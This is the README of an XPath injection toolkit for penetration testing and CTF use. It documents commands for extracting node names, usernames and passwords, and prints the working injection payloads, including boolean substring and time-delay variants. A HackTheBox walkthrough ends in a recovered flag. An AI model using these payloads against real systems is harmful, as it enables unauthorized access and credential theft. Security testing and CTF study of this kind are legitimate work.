# 🥷 XPathNinja

Advanced XPath Injection exploitation toolkit for penetration testing and CTF challenges.

[![Python](https://img.shields.io/badge/Python-3.8+-blue.svg)](https://www.python.org/)
[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![HackTheBox](https://img.shields.io/badge/HackTheBox-Profile-9FEF00.svg)](https://app.hackthebox.com/profile/1158811)

## ✨ Features

- 🎯 **Classic Extraction**: Direct character-by-character extraction using XPath substring
- ⏱️ **Time-Based Blind**: Exploit time delays for data exfiltration when no output is available
- 🔢 **Node Counting**: Enumerate XML structure and count elements
- 🚀 **Fast & Efficient**: Optimized bruteforce algorithms with real-time progress
- 🔧 **Burp Integration**: Built-in proxy support for debugging with Burp Suite
- 📊 **Visual Feedback**: Real-time display of extraction progress
- 🎨 **Clean API**: Reusable class-based design for integration

## 📸 Screenshots

### Classic XPath Extraction - Finding Node Name

![XPath Node Name Extraction](./images/1.png)

*Extracting the root node name character by character using XPath substring injection*

### Extracting Node Values

![XPath Value Extraction](./images/2.png)

*Extracting "accounts" node name from XML structure*

## 🚀 Installation

```bash
# Clone the repository
git clone https://github.com/Oxooi/XPathNinja.git
cd XPathNinja

# Install dependencies
pip install -r requirements.txt

# Run the tool
python xpath_ninja.py -h
```

### Requirements

- Python 3.8+
- requests
- urllib3

## 📖 Usage

### Basic Syntax

```bash
python xpath_ninja.py -u <URL> -m <MODE> -q <XPATH_QUERY> [OPTIONS]
```

### Modes

- **classic**: Standard XPath injection with direct output
- **count**: Count XML nodes
- **time**: Time-based blind injection

### Classic XPath Extraction

Extract node names or values using standard XPath injection:

```bash
# Extract root node name
python xpath_ninja.py -u http://target.com/index.php \
  -m classic \
  -q "name(/*[1])" \
  -s "Message successfully sent"

# Extract specific value (password)
python xpath_ninja.py -u http://target.com/index.php \
  -m classic \
  -q "/accounts/account[1]/password" \
  -s "success"

# Extract with custom field names
python xpath_ninja.py -u http://target.com/index.php \
  -m classic \
  -q "name(/*[1])" \
  -s "success" \
  --username-field "user" \
  --msg-field "message"
```

### Count Nodes

Enumerate the number of nodes in the XML structure:

```bash
# Count all child nodes
python xpath_ninja.py -u http://target.com/index.php \
  -m count \
  -q "/accounts/*" \
  -s "success"

# Count specific elements
python xpath_ninja.py -u http://target.com/index.php \
  -m count \
  -q "//account" \
  -s "Message successfully sent"
```

### Time-Based Blind Extraction

Extract data using time-based techniques when no direct output is available:

```bash
# Extract username using time delays
python xpath_ninja.py -u http://target.com/index.php \
  -m time \
  -q "/accounts/account[2]/username"

# Extract with custom baseline
python xpath_ninja.py -u http://target.com/index.php \
  -m time \
  -q "/accounts/account[1]/password" \
  --max-length 100
```

### With Burp Suite Proxy

Enable proxy for debugging and payload analysis:

```bash
# Use default Burp proxy (127.0.0.1:8080)
python xpath_ninja.py -u http://target.com/index.php \
  -m classic \
  -q "name(/*[1])" \
  -s "success" \
  --proxy

# Use custom proxy
python xpath_ninja.py -u http://target.com/index.php \
  -m classic \
  -q "name(/*[1])" \
  -s "success" \
  --proxy \
  --proxy-url "http://127.0.0.1:9090"
```

## 🎯 Common XPath Queries

### Node Structure Discovery

```xpath
name(/*[1])                          # Root node name
name(/*[1]/*[1])                     # First child node name
name(/accounts/*[1])                 # First child of 'accounts' node
count(/accounts/*)                   # Number of child nodes under 'accounts'
count(//account)                     # Total number of 'account' nodes
```

### Data Extraction

```xpath
/accounts/account[1]/username        # First account username
/accounts/account[1]/password        # First account password
/accounts/account[2]/email           # Second account email
//account[1]/username                # Username of first account anywhere
```

### Attributes

```xpath
/accounts/account[1]/@id             # Account ID attribute
/accounts/account[1]/@role           # Account role attribute
name(/accounts/account[1]/@*)        # Name of first attribute
```

### Advanced Queries

```xpath
/accounts/account[position()=1]/username       # Using position()
/accounts/account[last()]/username             # Last account username
/accounts/account[username='admin']/password   # Password where username is 'admin'
```

## 🛠️ Command-Line Arguments

| Argument | Short | Description | Required | Default |
|----------|-------|-------------|----------|---------|
| `--url` | `-u` | Target URL | ✅ | - |
| `--mode` | `-m` | Exploitation mode (classic/count/time) | ✅ | - |
| `--query` | `-q` | XPath query to exploit | ✅ | - |
| `--success` | `-s` | Success indicator string | ✅* | - |
| `--proxy` | - | Enable Burp Suite proxy | ❌ | False |
| `--proxy-url` | - | Custom proxy URL | ❌ | http://127.0.0.1:8080 |
| `--username-field` | - | Username field name in POST | ❌ | username |
| `--msg-field` | - | Message field name in POST | ❌ | msg |
| `--max-length` | - | Maximum extraction length | ❌ | 50 |

*Required for classic and count modes only

## 🎓 CTF Walkthrough Example

### Scenario: HackTheBox - XML Message Board

**Challenge**: A web application uses XML to store user messages. Find sensitive information.

#### Step 1: Discover Root Node Name

```bash
python xpath_ninja.py -u http://target:54356/ \
  -m classic \
  -q "name(/*[1])" \
  -s "Message successfully sent"
```

**Result**: `accounts`

#### Step 2: Count Number of Accounts

```bash
python xpath_ninja.py -u http://target:54356/ \
  -m count \
  -q "/accounts/*" \
  -s "Message successfully sent"
```

**Result**: `3` accounts found

#### Step 3: Discover Child Node Names

```bash
python xpath_ninja.py -u http://target:54356/ \
  -m classic \
  -q "name(/accounts/*[1])" \
  -s "Message successfully sent"
```

**Result**: `account`

#### Step 4: Extract First Account Username

```bash
python xpath_ninja.py -u http://target:54356/ \
  -m classic \
  -q "/accounts/account[1]/username" \
  -s "Message successfully sent"
```

**Result**: `admin`

#### Step 5: Extract First Account Password

```bash
python xpath_ninja.py -u http://target:54356/ \
  -m classic \
  -q "/accounts/account[1]/password" \
  -s "Message successfully sent" \
  --proxy
```

**Result**: `HTB{xp4th_1nj3ct10n_pwn3d!}`

## 💡 Tips & Tricks

### Optimizing Extraction Speed

1. **Reduce character set** if you know the format:
   ```python
   # Edit KEYWORD_DICT in the script for hex-only values
   KEYWORD_DICT = "0123456789abcdef"
   ```

2. **Use proxy only for debugging**: Remove `--proxy` flag for faster extraction

3. **Adjust max-length**: Set `--max-length` to expected length to avoid unnecessary testing

### Handling Different Response Indicators

The `-s` flag should match the unique success string in the response:

```bash
# Common success indicators
-s "Message successfully sent"
-s "success"
-s "Welcome"
-s "200 OK"
-s "<result>true</result>"
```

### Time-Based Troubleshooting

If time-based extraction isn't working:

1. Check baseline calculation - should be consistent
2. Increase threshold offset (modify `threshold_offset` in code)
3. Verify the payload causes significant delay
4. Check for network latency variations

## 🔬 How It Works

### Classic Injection

Uses XPath `substring()` function to extract one character at a time:

```xpath
' or substring(/path/to/value, 1, 1) = 'a' and '1'='1
```

The tool iterates through all possible characters until finding a match based on the success indicator.

### Time-Based Blind

Exploits XML processing time using exponential calculations:

```xpath
' or (substring(/path, 1, 1) = 'a' and count((//.)[count((//.))]) ) or '1'='2
```

When the condition is true, `count((//.)[count((//.))]))` executes, causing significant delay.

### Node Counting

Uses XPath `count()` function to determine number of nodes:

```xpath
' or count(/accounts/*) = 5 and '1'='1
```

Iterates through numbers until finding the correct count.

## ⚠️ Disclaimer

**For educational and authorized testing purposes only.**

This tool is designed for:
- ✅ Authorized penetration testing
- ✅ CTF competitions (HackTheBox, TryHackMe, etc.)
- ✅ Security research in controlled environments
- ✅ Educational demonstrations

**Illegal activities are strictly prohibited:**
- ❌ Unauthorized access to systems
- ❌ Testing without explicit permission
- ❌ Malicious use against production systems

By using this tool, you agree to:
- Only test systems you own or have written permission to test
- Comply with all applicable laws and regulations
- Take full responsibility for your actions

The author assumes no liability for misuse of this tool.

## 🤝 Contributing

Contributions are welcome! Here's how you can help:

### Reporting Bugs

Open an issue with:
- Python version
- Full command used
- Error message or unexpected behavior
- Target characteristics (if possible)

### Suggesting Features

Open an issue describing:
- The feature you'd like to see
- Use case and benefits
- Implementation ideas (optional)

### Pull Requests

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

## 📚 Resources

### XPath Injection References

- [OWASP XPath Injection](https://owasp.org/www-community/attacks/XPATH_Injection)
- [HackTricks XPath Injection](https://book.hacktricks.xyz/pentesting-web/xpath-injection)
- [PortSwigger XPath Injection](https://portswigger.net/web-security/xpath-injection)

### XPath Documentation

- [W3C XPath Specification](https://www.w3.org/TR/xpath/)
- [XPath Tutorial](https://www.w3schools.com/xml/xpath_intro.asp)
- [XPath Cheat Sheet](https://devhints.io/xpath)

## 📜 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 👤 Author

**0x001**

- GitHub: [@Oxooi](https://github.com/Oxooi)
- HackTheBox: [Profile #1158811](https://app.hackthebox.com/profile/1158811)
- Website: [Coming Soon]

## 🌟 Acknowledgments

- HackTheBox community for amazing CTF challenges
- OWASP for security research and documentation
- All contributors and users of this tool

---

**Made with 💀 for the hacking community**

*If you find this tool useful, please consider giving it a ⭐ on GitHub!*